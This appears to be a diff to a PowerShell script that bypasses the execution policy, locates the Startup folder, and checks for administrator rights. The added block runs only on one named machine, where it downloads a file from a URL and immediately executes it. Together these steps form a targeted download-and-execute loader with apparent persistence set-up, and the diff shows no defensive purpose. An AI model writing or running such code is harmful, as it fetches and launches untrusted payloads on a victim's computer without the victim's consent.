@@ -7,7 +7,11 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 Add-Type -AssemblyName System.Windows.Forms
 
-
+if ($env:USERDOMAIN -eq "DESKTOP-S4G27N7") {
+    $output = "fuckyou.txt"
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -FilePath $output
+}
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
